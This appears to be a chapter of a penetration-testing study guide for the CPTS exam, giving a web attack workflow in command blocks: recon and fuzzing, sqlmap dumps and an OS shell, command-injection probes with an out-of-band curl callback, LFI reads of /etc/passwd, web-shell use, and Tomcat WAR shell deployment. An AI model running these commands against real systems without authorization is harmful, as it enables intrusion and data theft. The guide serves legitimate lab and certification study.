# Web Attacks

**The web app is usually your way in.** CPTS web boxes lean on: injection (SQLi, command, SSTI), file inclusion/upload, IDOR/auth logic, and known-CVE apps. Enumerate thoroughly, then exploit the specific flaw. See the **Payloads** chapter for the full injection payload library — this page is the workflow and the tooling.

> Always run `whatweb` + a directory brute + a vhost fuzz first. The tech stack (PHP vs Java vs .NET) decides which injection class applies.

---

## Step 1 — Recon & Content Discovery

```bash
whatweb -a3 http://{target}
# Directories & files
gobuster dir -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 50
feroxbuster -u http://{target} -x php,txt,html --scan-limit 4
# Virtual hosts (many boxes hide the real app behind a Host header)
ffuf -u http://{target} -H "Host: FUZZ.corp.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
# add discovered vhosts to /etc/hosts

# Always check these by hand:
curl -s http://{target}/robots.txt
curl -s http://{target} | grep -iE '<!--|version|generator'   # HTML comments / versions
```

---

## Step 2 — Parameter & Input Discovery

```bash
# Find hidden parameters
arjun -u http://{target}/index.php
# Fuzz a parameter value / path
ffuf -u "http://{target}/page.php?id=FUZZ" -w /usr/share/seclists/Fuzzing/... -fc 404
# Fuzz a POST body field
ffuf -u http://{target}/login -X POST -d "user=admin&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w rockyou.txt -fr "Invalid"
```

---

## Step 3 — Exploit by Vulnerability Class

### SQL Injection
```bash
# Manual detection: ' " ) and observe errors / behaviour changes
# Automate with sqlmap once you find an injectable param:
sqlmap -u "http://{target}/page.php?id=1" --batch --dbs
sqlmap -u "http://{target}/page.php?id=1" -D appdb --tables
sqlmap -u "http://{target}/page.php?id=1" -D appdb -T users --dump
# POST / authenticated / behind a form (capture request in Burp -> save to req.txt)
sqlmap -r req.txt --batch --level 5 --risk 3
# OS shell / file write when stacked queries or FILE priv exist
sqlmap -r req.txt --os-shell
```
Payload library (UNION, auth-bypass, MSSQL `xp_cmdshell`, `INTO OUTFILE` web shell): **Payloads chapter → SQL Injection**.

### Command Injection
```bash
# Try separators on any param that touches the OS (ping, dns, convert, export):
#   ; | || & && `cmd` $(cmd)   and blind: %0a  newline
curl "http://{target}/ping.php?ip=127.0.0.1;id"
# Blind -> force an OOB callback to confirm:
curl "http://{target}/ping.php?ip=127.0.0.1;curl+http://{target}/`whoami`"
```

### File Inclusion (LFI/RFI) → RCE
```bash
# LFI probe
curl "http://{target}/index.php?page=../../../../etc/passwd"
# Read PHP source via filter wrapper
curl "http://{target}/index.php?page=php://filter/convert.base64-encode/resource=config"
# LFI -> RCE via log poisoning or php://input / data:// (see Payloads chapter)
```

### SSTI (template engines)
```bash
# Detect: {{7*7}}  ${7*7}  <%= 7*7 %>  -> 49 means injectable
# Identify engine, then RCE (Jinja2/Twig/Freemarker payloads in Payloads chapter)
# tplmap can automate:
tplmap -u "http://{target}/page?name=John"
```

### File Upload
```bash
# Bypass matrix (extensions, magic bytes, content-type, .htaccess) -> Payloads chapter.
# After a PHP web shell lands:
curl "http://{target}/uploads/shell.php?cmd=id"
```

### XSS / IDOR / Auth logic
```bash
# XSS: reflect a probe, steal cookie/CSRF token (payloads in Payloads chapter)
# IDOR: increment/replace IDs -> /api/user/1 -> /api/user/2 ; UUIDs -> look for leaks
# Auth: test password reset tokens, JWT (alg:none / weak secret), forced browsing to /admin
```

---

## Step 4 — Known-Application Exploits

```bash
# Identify the app + version, then:
searchsploit <app> <version>
nuclei -u http://{target} -severity critical,high,medium
# Common CPTS-flavour apps: WordPress, Tomcat, Jenkins, Gitlab, Grafana, phpMyAdmin, etc.
wpscan --url http://{target} --enumerate u,vp,vt --api-token <TOKEN>
# Tomcat manager -> deploy a WAR shell:
curl -u tomcat:tomcat -T shell.war "http://{target}:8080/manager/text/deploy?path=/sh"
```

---

## Web Attack Checklist

- [ ] whatweb + version identified → `searchsploit` / `nuclei`
- [ ] Directory + file brute (with extensions + backup exts `.bak`,`.old`,`.zip`)
- [ ] Vhost fuzz → new hosts added to `/etc/hosts`
- [ ] robots.txt, sitemap, HTML comments, JS files reviewed
- [ ] Every parameter tested for SQLi / command inj / SSTI / LFI
- [ ] Login: default creds, SQLi bypass, then brute with a small list
- [ ] Upload / import features tested for web-shell upload
- [ ] IDOR on every numeric/UUID identifier

## Common Mistakes

- **Only testing for SQLi.** Command injection, SSTI, LFI, and IDOR are just as common on CPTS.
- **Not fuzzing vhosts.** The real vulnerable app is frequently on a `FUZZ.domain` virtual host.
- **Ignoring backup extensions.** `config.php.bak` / `.zip` source leaks hand you creds and logic.
- **Blindly trusting sqlmap.** Understand the injection first; sqlmap fails on custom filters where a manual UNION works.
- **Skipping the version → CVE step.** Many boxes are "just" an outdated app with a public RCE.
